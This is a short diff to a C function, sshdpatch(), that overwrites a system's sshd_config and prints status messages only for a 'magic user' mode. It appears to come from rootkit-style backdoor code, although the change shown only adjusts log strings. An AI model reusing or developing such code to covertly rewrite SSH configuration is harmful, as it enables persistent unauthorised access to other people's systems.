@@ -156,10 +156,10 @@ void sshdpatch(int mode){
     size_t count = fwrite(sshdcontents, 1, strlen(sshdcontents), fp);
     if(!count){
         if(mode == MAGIC_USR)
-            printf("failed writing new sshd_config");
+            printf("failed writing new sshd_config\n");
     }else if(count >= sshdsize){
         if(mode == MAGIC_USR)
-            printf("successfully patched "SSHD_CONFIG);
+            printf("successfully patched sshd_config\n");
     }
 
     fflush(fp);
